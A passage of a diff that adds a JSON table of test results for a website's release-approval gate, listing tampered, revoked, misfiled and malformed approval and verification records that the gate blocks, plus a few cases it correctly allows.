@@ -1,0 +1,2850 @@
+{
+  "rows": [
+    {
+      "g": "success path",
+      "t": "a fully approved synthetic client-production build passes the real gate",
+      "ok": true,
+      "expected": "ALLOWED",
+      "observed": "ALLOWED (28 requirements)"
+    },
+    {
+      "g": "approvals",
+      "t": "no release approval",
+      "ok": true,
+      "expected": "BLOCKED by releaseApproval, productionHostAuthorised",
+      "observed": "BLOCKED by releaseApproval, productionHostAuthorised",
+      "allow": false
+    },
+    {
+      "g": "approvals",
+      "t": "a release approval bound to another candidate artifact",
+      "ok": true,
+      "rg": "RG-01",
+      "expected": "BLOCKED by releaseApproval, productionHostAuthorised",
+      "observed": "BLOCKED by releaseApproval, productionHostAuthorised",
+      "allow": false
+    },
+    {
+      "g": "approvals",
+      "t": "a release approval for another version",
+      "ok": true,
+      "expected": "BLOCKED by releaseApproval, productionHostAuthorised",
+      "observed": "BLOCKED by releaseApproval, productionHostAuthorised",
+      "allow": false
+    },
+    {
+      "g": "approvals",
+      "t": "a release approval for the demonstration channel",
+      "ok": true,
+      "expected": "BLOCKED by releaseApproval, productionHostAuthorised",
+      "observed": "BLOCKED by releaseApproval, productionHostAuthorised",
+      "allow": false
+    },
+    {
+      "g": "approvals",
+      "t": "a release approval record with a field missing (decidedBy)",
+      "ok": true,
+      "expected": "BLOCKED by releaseApproval, productionHostAuthorised, recordsValid",
+      "observed": "BLOCKED by recordsValid, releaseApproval, productionHostAuthorised",
+      "allow": false
+    },
+    {
+      "g": "approvals",
+      "t": "a release approval whose status is \"rejected\"",
+      "ok": true,
+      "rg": "RG-04",
+      "expected": "BLOCKED by releaseApproval, productionHostAuthorised",
+      "observed": "BLOCKED by releaseApproval, productionHostAuthorised",
+      "allow": false
+    },
+    {
+      "g": "approvals",
+      "t": "an approval and a later rejection by an authorised reviewer (both in force)",
+      "ok": true,
+      "rg": "RG-04",
+      "expected": "BLOCKED by releaseApproval, productionHostAuthorised",
+      "observed": "BLOCKED by releaseApproval, productionHostAuthorised",
+      "allow": false
+    },
+    {
+      "g": "approvals",
+      "t": "an approval revoked by an authorised reviewer",
+      "ok": true,
+      "rg": "RG-06",
+      "expected": "BLOCKED by releaseApproval, productionHostAuthorised",
+      "observed": "BLOCKED by releaseApproval, productionHostAuthorised",
+      "allow": false
+    },
+    {
+      "g": "approvals",
+      "t": "an approval superseded by an authorised reviewer, with no replacement",
+      "ok": true,
+      "rg": "RG-06",
+      "expected": "BLOCKED by releaseApproval, productionHostAuthorised",
+      "observed": "BLOCKED by releaseApproval, productionHostAuthorised",
+      "allow": false
+    },
+    {
+      "g": "approvals",
+      "t": "a status written as prose (\"approved (REVOKED)\")",
+      "ok": true,
+      "rg": "RG-06",
+      "expected": "BLOCKED by releaseApproval, productionHostAuthorised, recordsValid",
+      "observed": "BLOCKED by recordsValid, releaseApproval, productionHostAuthorised",
+      "allow": false
+    },
+    {
+      "g": "approvals",
+      "t": "a status the model does not know (\"pending\")",
+      "ok": true,
+      "expected": "BLOCKED by releaseApproval, productionHostAuthorised, recordsValid",
+      "observed": "BLOCKED by recordsValid, releaseApproval, productionHostAuthorised",
+      "allow": false
+    },
+    {
+      "g": "approvals",
+      "t": "an unauthorised revocation (a rights reviewer): the approval stays, but the record blocks until resolved",
+      "ok": true,
+      "rg": "RG-06",
+      "expected": "BLOCKED by recordsValid",
+      "observed": "BLOCKED by recordsValid",
+      "allow": false
+    },
+    {
+      "g": "approvals",
+      "t": "an unauthorised rejection (a reviewer not in the table)",
+      "ok": true,
+      "rg": "RG-04",
+      "expected": "BLOCKED by recordsValid",
+      "observed": "BLOCKED by recordsValid",
+      "allow": false
+    },
+    {
+      "g": "approvals",
+      "t": "a revocation that ends a record that does not exist",
+      "ok": true,
+      "expected": "BLOCKED by recordsValid",
+      "observed": "BLOCKED by recordsValid",
+      "allow": false
+    },
+    {
+      "g": "approvals",
+      "t": "a revocation that names an approval recorded for another candidate",
+      "ok": true,
+      "expected": "BLOCKED by recordsValid",
+      "observed": "BLOCKED by recordsValid",
+      "allow": false
+    },
+    {
+      "g": "approvals",
+      "t": "a revocation dated before the approval it ends",
+      "ok": true,
+      "expected": "BLOCKED by recordsValid",
+      "observed": "BLOCKED by recordsValid",
+      "allow": false
+    },
+    {
+      "g": "approvals",
+      "t": "a revocation of a revocation",
+      "ok": true,
+      "expected": "BLOCKED by releaseApproval, productionHostAuthorised, recordsValid",
+      "observed": "BLOCKED by recordsValid, releaseApproval, productionHostAuthorised",
+      "allow": false
+    },
+    {
+      "g": "approvals",
+      "t": "a revocation with no \"ends\" field",
+      "ok": true,
+      "expected": "BLOCKED by recordsValid",
+      "observed": "BLOCKED by recordsValid",
+      "allow": false
+    },
+    {
+      "g": "approvals",
+      "t": "a release approval by a reviewer who is not in the reviewer table",
+      "ok": true,
+      "expected": "BLOCKED by releaseApproval, productionHostAuthorised",
+      "observed": "BLOCKED by releaseApproval, productionHostAuthorised",
+      "allow": false
+    },
+    {
+      "g": "approvals",
+      "t": "a release approval by a reviewer who may not approve it (the rights persona)",
+      "ok": true,
+      "expected": "BLOCKED by releaseApproval, productionHostAuthorised",
+      "observed": "BLOCKED by releaseApproval, productionHostAuthorised",
+      "allow": false
+    },
+    {
+      "g": "approvals",
+      "t": "a release approval signed with the wrong name for a valid reviewer id",
+      "ok": true,
+      "expected": "BLOCKED by releaseApproval, productionHostAuthorised",
+      "observed": "BLOCKED by releaseApproval, productionHostAuthorised",
+      "allow": false
+    },
+    {
+      "g": "approvals",
+      "t": "a release approval decided before the reviewer was authorised",
+      "ok": true,
+      "expected": "BLOCKED by releaseApproval, productionHostAuthorised",
+      "observed": "BLOCKED by releaseApproval, productionHostAuthorised",
+      "allow": false
+    },
+    {
+      "g": "approvals",
+      "t": "an empty reviewer table (nobody is authorised)",
+      "ok": true,
+      "expected": "BLOCKED by releaseApproval, productionHostAuthorised, rightsVerification, searchReadiness (may also: externalLinksReview, mediaRightsInventory, socialImageRights)",
+      "observed": "BLOCKED by releaseApproval, productionHostAuthorised, rightsVerification, searchReadiness, externalLinksReview, mediaRightsInventory, socialImageRights",
+      "allow": false
+    },
+    {
+      "g": "approvals",
+      "t": "a reviewer table with a duplicate reviewer id",
+      "ok": true,
+      "expected": "BLOCKED by recordsValid",
+      "observed": "BLOCKED by recordsValid",
+      "allow": false
+    },
+    {
+      "g": "approvals",
+      "t": "a reviewer table established by a governance record that does not exist",
+      "ok": true,
+      "expected": "BLOCKED by recordsValid",
+      "observed": "BLOCKED by recordsValid",
+      "allow": false
+    },
+    {
+      "g": "approvals",
+      "t": "an approval dated in the future",
+      "ok": true,
+      "expected": "BLOCKED by releaseApproval, productionHostAuthorised, recordsValid",
+      "observed": "BLOCKED by recordsValid, releaseApproval, productionHostAuthorised",
+      "allow": false
+    },
+    {
+      "g": "approvals",
+      "t": "a record file that is not valid JSON",
+      "ok": true,
+      "expected": "BLOCKED by recordsValid",
+      "observed": "BLOCKED by recordsValid",
+      "allow": false
+    },
+    {
+      "g": "approvals",
+      "t": "a record of an unknown type",
+      "ok": true,
+      "expected": "BLOCKED by recordsValid",
+      "observed": "BLOCKED by recordsValid",
+      "allow": false
+    },
+    {
+      "g": "approvals",
+      "t": "a required governance approval (APR-JE-017) missing from the ledger",
+      "ok": true,
+      "expected": "BLOCKED by requiredApprovalsPresent",
+      "observed": "BLOCKED by requiredApprovalsPresent",
+      "allow": false
+    },
+    {
+      "g": "domain",
+      "t": "a release approval that carries no production host",
+      "ok": true,
+      "expected": "BLOCKED by releaseApproval, productionHostAuthorised, recordsValid (may also: externalLinks, externalLinksReview, mediaRightsInventory, socialImageRights, dependencySecurity, sbomVerified, dependencyPolicy, supportedRuntimes)",
+      "observed": "BLOCKED by recordsValid, releaseApproval, productionHostAuthorised",
+      "allow": false
+    },
+    {
+      "g": "domain",
+      "t": "a release approval for another production host",
+      "ok": true,
+      "expected": "BLOCKED by productionHostAuthorised (may also: externalLinks, externalLinksReview, mediaRightsInventory, socialImageRights, dependencySecurity, sbomVerified, dependencyPolicy, supportedRuntimes)",
+      "observed": "BLOCKED by productionHostAuthorised",
+      "allow": false
+    },
+    {
+      "g": "domain",
+      "t": "a release approval for a host that is a preview address (pages.dev) while the build is for the real host",
+      "ok": true,
+      "expected": "BLOCKED by productionHostAuthorised (may also: externalLinks, externalLinksReview, mediaRightsInventory, socialImageRights, dependencySecurity, sbomVerified, dependencyPolicy, supportedRuntimes)",
+      "observed": "BLOCKED by productionHostAuthorised",
+      "allow": false
+    },
+    {
+      "g": "domain",
+      "t": "a staging domain (pages.dev) as the production host",
+      "ok": true,
+      "expected": "BLOCKED by productionDomain, productionHostAuthorised (may also: externalLinks, externalLinksReview, mediaRightsInventory, socialImageRights, dependencySecurity, sbomVerified, dependencyPolicy, supportedRuntimes)",
+      "observed": "BLOCKED by productionHostAuthorised, productionDomain",
+      "allow": false
+    },
+    {
+      "g": "domain",
+      "t": "a reserved example domain (.test)",
+      "ok": true,
+      "expected": "BLOCKED by productionDomain, productionHostAuthorised (may also: externalLinks, externalLinksReview, mediaRightsInventory, socialImageRights, dependencySecurity, sbomVerified, dependencyPolicy, supportedRuntimes)",
+      "observed": "BLOCKED by productionHostAuthorised, productionDomain",
+      "allow": false
+    },
+    {
+      "g": "domain",
+      "t": "a staging label in the host name (staging.)",
+      "ok": true,
+      "expected": "BLOCKED by productionDomain, productionHostAuthorised (may also: externalLinks, externalLinksReview, mediaRightsInventory, socialImageRights, dependencySecurity, sbomVerified, dependencyPolicy, supportedRuntimes)",
+      "observed": "BLOCKED by productionHostAuthorised, productionDomain",
+      "allow": false
+    },
+    {
+      "g": "domain",
+      "t": "the domain changed after sign-off (committed, nothing re-recorded)",
+      "ok": true,
+      "expected": "BLOCKED by releaseApproval, productionHostAuthorised, rightsVerification, searchReadiness, verifyPassed, evidence:real-device, evidence:screen-reader, evidence:browser-matrix, evidence:ci-run (may also: assetManifestCurrent, externalLinks, externalLinksReview, mediaRightsInventory, socialImageRights, dependencySecurity, sbomVerified, dependencyPolicy, supportedRuntimes)",
+      "observed": "BLOCKED by verifyPassed, releaseApproval, productionHostAuthorised, rightsVerification, evidence:real-device, evidence:screen-reader, evidence:browser-matrix, evidence:ci-run, searchReadiness, assetManifestCurrent, externalLinksReview, mediaRightsInventory, socialImageRights, sbomVerified",
+      "allow": false
+    },
+    {
+      "g": "domain",
+      "t": "a staging word inside a sub-domain label (jade-staging.)",
+      "ok": true,
+      "expected": "BLOCKED by productionDomain, productionHostAuthorised (may also: externalLinks, externalLinksReview, mediaRightsInventory, socialImageRights, dependencySecurity, sbomVerified, dependencyPolicy, supportedRuntimes)",
+      "observed": "BLOCKED by productionHostAuthorised, productionDomain",
+      "allow": false
+    },
+    {
+      "g": "domain",
+      "t": "a numbered staging label (stage2.)",
+      "ok": true,
+      "expected": "BLOCKED by productionDomain, productionHostAuthorised (may also: externalLinks, externalLinksReview, mediaRightsInventory, socialImageRights, dependencySecurity, sbomVerified, dependencyPolicy, supportedRuntimes)",
+      "observed": "BLOCKED by productionHostAuthorised, productionDomain",
+      "allow": false
+    },
+    {
+      "g": "domain",
+      "t": "another hosting provider's preview domain (azurestaticapps.net)",
+      "ok": true,
+      "expected": "BLOCKED by productionDomain, productionHostAuthorised (may also: externalLinks, externalLinksReview, mediaRightsInventory, socialImageRights, dependencySecurity, sbomVerified, dependencyPolicy, supportedRuntimes)",
+      "observed": "BLOCKED by productionHostAuthorised, productionDomain",
+      "allow": false
+    },
+    {
+      "g": "domain",
+      "t": "a local address (https://localhost): the build refuses, or the gate does",
+      "ok": true,
+      "expected": "the tool stops and nothing is allowed",
+      "observed": "tool error, exit 1: file:///tmp/je-dryrun-Wyx11r/jade-and-ember/engineering/lib/site.mjs:17",
+      "allow": false
+    },
+    {
+      "g": "domain",
+      "t": "an IP address (https://192.0.2.10): the build refuses, or the gate does",
+      "ok": true,
+      "expected": "BLOCKED by productionDomain, productionHostAuthorised (may also: externalLinks, externalLinksReview, mediaRightsInventory, socialImageRights, dependencySecurity, sbomVerified, dependencyPolicy, supportedRuntimes)",
+      "observed": "BLOCKED by productionHostAuthorised, productionDomain",
+      "allow": false
+    },
+    {
+      "g": "approvals",
+      "t": "no rights verification",
+      "ok": true,
+      "expected": "BLOCKED by rightsVerification (may also: mediaRightsInventory, socialImageRights)",
+      "observed": "BLOCKED by rightsVerification, mediaRightsInventory, socialImageRights",
+      "allow": false
+    },
+    {
+      "g": "approvals",
+      "t": "a rights verification that was rejected (\"NOT verified\")",
+      "ok": true,
+      "rg": "RG-05",
+      "expected": "BLOCKED by rightsVerification (may also: mediaRightsInventory, socialImageRights)",
+      "observed": "BLOCKED by rightsVerification, mediaRightsInventory, socialImageRights",
+      "allow": false
+    },
+    {
+      "g": "approvals",
+      "t": "a rights verification revoked by an authorised reviewer",
+      "ok": true,
+      "rg": "RG-05",
+      "expected": "BLOCKED by rightsVerification (may also: mediaRightsInventory, socialImageRights)",
+      "observed": "BLOCKED by rightsVerification, mediaRightsInventory, socialImageRights",
+      "allow": false
+    },
+    {
+      "g": "approvals",
+      "t": "a rights verification that names no source",
+      "ok": true,
+      "expected": "BLOCKED by rightsVerification, recordsValid (may also: mediaRightsInventory, socialImageRights)",
+      "observed": "BLOCKED by recordsValid, rightsVerification, mediaRightsInventory, socialImageRights",
+      "allow": false
+    },
+    {
+      "g": "approvals",
+      "t": "a rights verification with no date",
+      "ok": true,
+      "expected": "BLOCKED by rightsVerification, recordsValid (may also: mediaRightsInventory, socialImageRights)",
+      "observed": "BLOCKED by recordsValid, rightsVerification, mediaRightsInventory, socialImageRights",
+      "allow": false
+    },
+    {
+      "g": "approvals",
+      "t": "a rights verification bound to another candidate",
+      "ok": true,
+      "expected": "BLOCKED by rightsVerification (may also: mediaRightsInventory, socialImageRights)",
+      "observed": "BLOCKED by rightsVerification, mediaRightsInventory, socialImageRights",
+      "allow": false
+    },
+    {
+      "g": "approvals",
+      "t": "no search review",
+      "ok": true,
+      "expected": "BLOCKED by searchReadiness",
+      "observed": "BLOCKED by searchReadiness",
+      "allow": false
+    },
+    {
+      "g": "approvals",
+      "t": "a search review that was rejected (\"NOT reviewed\")",
+      "ok": true,
+      "rg": "RG-07",
+      "expected": "BLOCKED by searchReadiness",
+      "observed": "BLOCKED by searchReadiness",
+      "allow": false
+    },
+    {
+      "g": "approvals",
+      "t": "a search review revoked by an authorised reviewer",
+      "ok": true,
+      "rg": "RG-07",
+      "expected": "BLOCKED by searchReadiness",
+      "observed": "BLOCKED by searchReadiness",
+      "allow": false
+    },
+    {
+      "g": "approvals",
+      "t": "a search review for other search artifacts (digest altered)",
+      "ok": true,
+      "expected": "BLOCKED by searchReadiness",
+      "observed": "BLOCKED by searchReadiness",
+      "allow": false
+    },
+    {
+      "g": "approvals",
+      "t": "a search review that does not list the crawler policy",
+      "ok": true,
+      "expected": "BLOCKED by searchReadiness, recordsValid",
+      "observed": "BLOCKED by recordsValid, searchReadiness",
+      "allow": false
+    },
+    {
+      "g": "approvals",
+      "t": "a search review that does not list the structured data",
+      "ok": true,
+      "expected": "BLOCKED by searchReadiness, recordsValid",
+      "observed": "BLOCKED by recordsValid, searchReadiness",
+      "allow": false
+    },
+    {
+      "g": "approvals",
+      "t": "a search review for another candidate",
+      "ok": true,
+      "expected": "BLOCKED by searchReadiness",
+      "observed": "BLOCKED by searchReadiness",
+      "allow": false
+    },
+    {
+      "g": "verification",
+      "t": "no verification record",
+      "ok": true,
+      "expected": "BLOCKED by verifyPassed",
+      "observed": "BLOCKED by verifyPassed",
+      "allow": false
+    },
+    {
+      "g": "verification",
+      "t": "a hand-written report in the old format ({ mode, passed, commit, dirty, assetsTree })",
+      "ok": true,
+      "rg": "RG-08",
+      "expected": "BLOCKED by verifyPassed",
+      "observed": "BLOCKED by verifyPassed",
+      "allow": false
+    },
+    {
+      "g": "verification",
+      "t": "a record edited by hand (the seal no longer matches)",
+      "ok": true,
+      "rg": "RG-08",
+      "expected": "BLOCKED by verifyPassed",
+      "observed": "BLOCKED by verifyPassed",
+      "allow": false
+    },
+    {
+      "g": "verification",
+      "t": "a record with a check removed and the seal recomputed",
+      "ok": true,
+      "rg": "RG-08",
+      "expected": "BLOCKED by verifyPassed",
+      "observed": "BLOCKED by verifyPassed",
+      "allow": false
+    },
+    {
+      "g": "verification",
+      "t": "a record with a check the verifier does not define, seal recomputed",
+      "ok": true,
+      "rg": "RG-08",
+      "expected": "BLOCKED by verifyPassed",
+      "observed": "BLOCKED by verifyPassed",
+      "allow": false
+    },
+    {
+      "g": "verification",
+      "t": "a record that lists a check twice, seal recomputed",
+      "ok": true,
+      "rg": "RG-08",
+      "expected": "BLOCKED by verifyPassed",
+      "observed": "BLOCKED by verifyPassed",
+      "allow": false
+    },
+    {
+      "g": "verification",
+      "t": "a record with a failing check, seal recomputed",
+      "ok": true,
+      "expected": "BLOCKED by verifyPassed",
+      "observed": "BLOCKED by verifyPassed",
+      "allow": false
+    },
+    {
+      "g": "verification",
+      "t": "a record that says passed although a check failed",
+      "ok": true,
+      "rg": "RG-08",
+      "expected": "BLOCKED by verifyPassed",
+      "observed": "BLOCKED by verifyPassed",
+      "allow": false
+    },
+    {
+      "g": "verification",
+      "t": "a fast (partial) verification",
+      "ok": true,
+      "expected": "BLOCKED by verifyPassed",
+      "observed": "BLOCKED by verifyPassed",
+      "allow": false
+    },
+    {
+      "g": "verification",
+      "t": "a failed verification",
+      "ok": true,
+      "expected": "BLOCKED by verifyPassed",
+      "observed": "BLOCKED by verifyPassed",
+      "allow": false
+    },
+    {
+      "g": "verification",
+      "t": "a verification of another candidate artifact",
+      "ok": true,
+      "rg": "RG-01",
+      "expected": "BLOCKED by verifyPassed",
+      "observed": "BLOCKED by verifyPassed",
+      "allow": false
+    },
+    {
+      "g": "verification",
+      "t": "a verification made by other verification code (engine digest differs)",
+      "ok": true,
+      "rg": "RG-08",
+      "expected": "BLOCKED by verifyPassed",
+      "observed": "BLOCKED by verifyPassed",
+      "allow": false
+    },
+    {
+      "g": "verification",
+      "t": "a verification whose registry digest is not the verifier's",
+      "ok": true,
+      "expected": "BLOCKED by verifyPassed",
+      "observed": "BLOCKED by verifyPassed",
+      "allow": false
+    },
+    {
+      "g": "verification",
+      "t": "a verification run on a dirty tree",
+      "ok": true,
+      "expected": "BLOCKED by verifyPassed",
+      "observed": "BLOCKED by verifyPassed",
+      "allow": false
+    },
+    {
+      "g": "verification",
+      "t": "a corrupt verification record (not JSON)",
+      "ok": true,
+      "expected": "the tool stops and nothing is allowed",
+      "observed": "tool error, exit 2: SyntaxError: Expected property name or '}' in JSON at position 1 (line 1 column 2)",
+      "allow": false
+    },
+    {
+      "g": "verification",
+      "t": "the verifying code changed after the verification (a check edited and committed): the local record and the CI summary both belong to the old code",
+      "ok": true,
+      "rg": "RG-08",
+      "expected": "BLOCKED by verifyPassed, evidence:ci-run",
+      "observed": "BLOCKED by verifyPassed, evidence:ci-run",
+      "allow": false
+    },
+    {
+      "g": "candidate",
+      "t": "a stale recorded asset manifest (assets.manifest.json from another build)",
+      "ok": true,
+      "rg": "RG-09",
+      "expected": "BLOCKED by assetManifestCurrent (may also: externalLinks, externalLinksReview, mediaRightsInventory, socialImageRights, dependencySecurity, sbomVerified, dependencyPolicy, supportedRuntimes)",
+      "observed": "BLOCKED by assetManifestCurrent",
+      "allow": false
+    },
+    {
+      "g": "candidate",
+      "t": "a delivered file edited after sign-off, committed, nothing re-recorded",
+      "ok": true,
+      "rg": "RG-01",
+      "expected": "BLOCKED by verifyPassed, releaseApproval, productionHostAuthorised, rightsVerification, searchReadiness, evidence:real-device, evidence:screen-reader, evidence:browser-matrix, evidence:ci-run (may also: assetManifestCurrent, externalLinks, externalLinksReview, mediaRightsInventory, socialImageRights, dependencySecurity, sbomVerified, dependencyPolicy, supportedRuntimes)",
+      "observed": "BLOCKED by verifyPassed, releaseApproval, productionHostAuthorised, rightsVerification, evidence:real-device, evidence:screen-reader, evidence:browser-matrix, evidence:ci-run, searchReadiness, assetManifestCurrent, externalLinksReview, mediaRightsInventory, socialImageRights, sbomVerified",
+      "allow": false
+    },
+    {
+      "g": "candidate",
+      "t": "a configuration value changed after sign-off, committed, nothing re-recorded",
+      "ok": true,
+      "rg": "RG-01",
+      "expected": "BLOCKED by verifyPassed, releaseApproval, productionHostAuthorised, rightsVerification, searchReadiness, evidence:real-device, evidence:screen-reader, evidence:browser-matrix, evidence:ci-run (may also: assetManifestCurrent, externalLinks, externalLinksReview, mediaRightsInventory, socialImageRights, dependencySecurity, sbomVerified, dependencyPolicy, supportedRuntimes)",
+      "observed": "BLOCKED by verifyPassed, releaseApproval, productionHostAuthorised, rightsVerification, evidence:real-device, evidence:screen-reader, evidence:browser-matrix, evidence:ci-run, searchReadiness, assetManifestCurrent, externalLinks, externalLinksReview, mediaRightsInventory, socialImageRights, sbomVerified",
+      "allow": false
+    },
+    {
+      "g": "candidate",
+      "t": "the release policy changed after sign-off, committed, nothing re-recorded",
+      "ok": true,
+      "rg": "RG-01",
+      "expected": "BLOCKED by verifyPassed, releaseApproval, productionHostAuthorised, rightsVerification, searchReadiness, evidence:real-device, evidence:screen-reader, evidence:browser-matrix, evidence:ci-run (may also: externalLinks, externalLinksReview, mediaRightsInventory, socialImageRights, dependencySecurity, sbomVerified, dependencyPolicy, supportedRuntimes)",
+      "observed": "BLOCKED by verifyPassed, releaseApproval, productionHostAuthorised, rightsVerification, evidence:real-device, evidence:screen-reader, evidence:browser-matrix, evidence:ci-run, searchReadiness, externalLinksReview, mediaRightsInventory, socialImageRights",
+      "allow": false
+    },
+    {
+      "g": "candidate",
+      "t": "the lockfile changed after sign-off, committed, nothing re-recorded",
+      "ok": true,
+      "rg": "RG-01",
+      "expected": "BLOCKED by verifyPassed, releaseApproval, productionHostAuthorised, rightsVerification, searchReadiness, evidence:real-device, evidence:screen-reader, evidence:browser-matrix, evidence:ci-run (may also: externalLinks, externalLinksReview, mediaRightsInventory, socialImageRights, dependencySecurity, sbomVerified, dependencyPolicy, supportedRuntimes)",
+      "observed": "BLOCKED by verifyPassed, releaseApproval, productionHostAuthorised, rightsVerification, evidence:real-device, evidence:screen-reader, evidence:browser-matrix, evidence:ci-run, searchReadiness, externalLinksReview, mediaRightsInventory, socialImageRights, dependencySecurity, sbomVerified",
+      "allow": false
+    },
+    {
+      "g": "candidate",
+      "t": "an edit to a delivered file after testing, NOT committed (dirty tree)",
+      "ok": true,
+      "expected": "BLOCKED by cleanTree, verifyPassed, releaseApproval, productionHostAuthorised, rightsVerification, searchReadiness, evidence:real-device, evidence:screen-reader, evidence:browser-matrix, evidence:ci-run (may also: assetManifestCurrent, externalLinks, externalLinksReview, mediaRightsInventory, socialImageRights, dependencySecurity, sbomVerified, dependencyPolicy, supportedRuntimes)",
+      "observed": "BLOCKED by cleanTree, verifyPassed, releaseApproval, productionHostAuthorised, rightsVerification, evidence:real-device, evidence:screen-reader, evidence:browser-matrix, evidence:ci-run, searchReadiness, assetManifestCurrent, externalLinksReview, mediaRightsInventory, socialImageRights, sbomVerified",
+      "allow": false
+    },
+    {
+      "g": "tree",
+      "t": "an untracked file in the working tree",
+      "ok": true,
+      "expected": "BLOCKED by cleanTree (may also: externalLinks, externalLinksReview, mediaRightsInventory, socialImageRights, dependencySecurity, sbomVerified, dependencyPolicy, supportedRuntimes)",
+      "observed": "BLOCKED by cleanTree",
+      "allow": false
+    },
+    {
+      "g": "stays-valid",
+      "t": "RG-01: only a document is committed after sign-off (the digest does not move)",
+      "ok": true,
+      "rg": "RG-01",
+      "expected": "ALLOWED (this must not block)",
+      "observed": "ALLOWED",
+      "allow": true
+    },
+    {
+      "g": "stays-valid",
+      "t": "RG-01: the ledger gains a governance row after sign-off",
+      "ok": true,
+      "rg": "RG-01",
+      "expected": "ALLOWED (this must not block)",
+      "observed": "ALLOWED",
+      "allow": true
+    },
+    {
+      "g": "stays-valid",
+      "t": "RG-01: a second reviewer is added to the table after sign-off",
+      "ok": true,
+      "rg": "RG-01",
+      "expected": "ALLOWED (this must not block)",
+      "observed": "ALLOWED",
+      "allow": true
+    },
+    {
+      "g": "stays-valid",
+      "t": "RG-04: the words REJECTED and REVOKED in the rationale of an approved record",
+      "ok": true,
+      "rg": "RG-04",
+      "expected": "ALLOWED (this must not block)",
+      "observed": "ALLOWED",
+      "allow": true
+    },
+    {
+      "g": "stays-valid",
+      "t": "RG-05: \"NOT verified\" in the rationale of an approved rights verification",
+      "ok": true,
+      "rg": "RG-05",
+      "expected": "ALLOWED (this must not block)",
+      "observed": "ALLOWED",
+      "allow": true
+    },
+    {
+      "g": "stays-valid",
+      "t": "RG-07: \"NOT reviewed\" in the rationale of an approved search review",
+      "ok": true,
+      "rg": "RG-07",
+      "expected": "ALLOWED (this must not block)",
+      "observed": "ALLOWED",
+      "allow": true
+    },
+    {
+      "g": "stays-valid",
+      "t": "an approval revoked, then a NEW approval recorded by an authorised reviewer",
+      "ok": true,
+      "rg": "RG-06",
+      "expected": "ALLOWED (this must not block)",
+      "observed": "ALLOWED",
+      "allow": true
+    },
+    {
+      "g": "stays-valid",
+      "t": "a rejection superseded by an authorised reviewer, then approved",
+      "ok": true,
+      "rg": "RG-04",
+      "expected": "ALLOWED (this must not block)",
+      "observed": "ALLOWED",
+      "allow": true
+    },
+    {
+      "g": "stays-valid",
+      "t": "history: a rejection and an approval recorded for an older candidate",
+      "ok": true,
+      "expected": "ALLOWED (this must not block)",
+      "observed": "ALLOWED",
+      "allow": true
+    },
+    {
+      "g": "stays-valid",
+      "t": "two approvals of the same release by two authorised reviewers",
+      "ok": true,
+      "expected": "ALLOWED (this must not block)",
+      "observed": "ALLOWED",
+      "allow": true
+    },
+    {
+      "g": "stays-valid",
+      "t": "a positive record by an unauthorised person (not counted, harmless)",
+      "ok": true,
+      "expected": "ALLOWED (this must not block)",
+      "observed": "ALLOWED",
+      "allow": true
+    },
+    {
+      "g": "records",
+      "t": "a REJECTION filed in deployments/ (the wrong family): it would never be read, so the folder refuses it",
+      "ok": true,
+      "rg": "RG-04",
+      "expected": "BLOCKED by recordsValid",
+      "observed": "BLOCKED by recordsValid",
+      "allow": false
+    },
+    {
+      "g": "records",
+      "t": "a REJECTION filed in evidence/ (not an evidence record): refused, and evidence is not accepted beside it",
+      "ok": true,
+      "rg": "RG-04",
+      "expected": "BLOCKED by evidence:real-device, evidence:screen-reader, evidence:browser-matrix, evidence:ci-run",
+      "observed": "BLOCKED by evidence:real-device, evidence:screen-reader, evidence:browser-matrix, evidence:ci-run",
+      "allow": false
+    },
+    {
+      "g": "records",
+      "t": "a REJECTION saved as REL-JE-902.JSON (upper-case extension)",
+      "ok": true,
+      "rg": "RG-04",
+      "expected": "BLOCKED by recordsValid",
+      "observed": "BLOCKED by recordsValid",
+      "allow": false
+    },
+    {
+      "g": "records",
+      "t": "a REJECTION saved as REL-JE-902.json.bak",
+      "ok": true,
+      "rg": "RG-04",
+      "expected": "BLOCKED by recordsValid",
+      "observed": "BLOCKED by recordsValid",
+      "allow": false
+    },
+    {
+      "g": "records",
+      "t": "a REJECTION in a sub-folder (approvals/old/REL-JE-902.json)",
+      "ok": true,
+      "rg": "RG-04",
+      "expected": "BLOCKED by recordsValid",
+      "observed": "BLOCKED by recordsValid",
+      "allow": false
+    },
+    {
+      "g": "records",
+      "t": "a record that is a symlink to a file outside the repository",
+      "ok": true,
+      "rg": "RG-04",
+      "expected": "BLOCKED by recordsValid",
+      "observed": "BLOCKED by recordsValid",
+      "allow": false
+    },
+    {
+      "g": "records",
+      "t": "a REJECTION that exists in the working tree but git has been told to ignore (never committed)",
+      "ok": true,
+      "rg": "RG-04",
+      "expected": "BLOCKED by recordsValid",
+      "observed": "BLOCKED by recordsValid",
+      "allow": false
+    },
+    {
+      "g": "records",
+      "t": "a record file that repeats a key (\"status\":\"rejected\" ... \"status\":\"approved\")",
+      "ok": true,
+      "rg": "RG-04",
+      "expected": "BLOCKED by recordsValid",
+      "observed": "BLOCKED by recordsValid",
+      "allow": false
+    },
+    {
+      "g": "records",
+      "t": "a rejection filed under another record's file name (REL-JE-903.json holds REL-JE-902)",
+      "ok": true,
+      "expected": "BLOCKED by recordsValid",
+      "observed": "BLOCKED by recordsValid",
+      "allow": false
+    },
+    {
+      "g": "records",
+      "t": "a veto lifted by a reviewer who may revoke but could never have rejected (supersession is not a back door)",
+      "ok": true,
+      "rg": "RG-04",
+      "expected": "BLOCKED by releaseApproval, productionHostAuthorised, recordsValid",
+      "observed": "BLOCKED by recordsValid, releaseApproval, productionHostAuthorised",
+      "allow": false
+    },
+    {
+      "g": "records",
+      "t": "a decision time that does not exist (2026-02-30)",
+      "ok": true,
+      "expected": "BLOCKED by releaseApproval, productionHostAuthorised, recordsValid",
+      "observed": "BLOCKED by recordsValid, releaseApproval, productionHostAuthorised",
+      "allow": false
+    },
+    {
+      "g": "records",
+      "t": "a decision time of 24:00:00",
+      "ok": true,
+      "expected": "BLOCKED by releaseApproval, productionHostAuthorised, recordsValid",
+      "observed": "BLOCKED by recordsValid, releaseApproval, productionHostAuthorised",
+      "allow": false
+    },
+    {
+      "g": "records",
+      "t": "a decision time with fractional seconds (ordering by text would be wrong)",
+      "ok": true,
+      "expected": "BLOCKED by releaseApproval, productionHostAuthorised, recordsValid",
+      "observed": "BLOCKED by recordsValid, releaseApproval, productionHostAuthorised",
+      "allow": false
+    },
+    {
+      "g": "records",
+      "t": "an approval timed an hour from now (later today is still the future)",
+      "ok": true,
+      "expected": "BLOCKED by releaseApproval, productionHostAuthorised, recordsValid",
+      "observed": "BLOCKED by recordsValid, releaseApproval, productionHostAuthorised",
+      "allow": false
+    },
+    {
+      "g": "records",
+      "t": "an array where a string belongs (candidate: [\"…\"])",
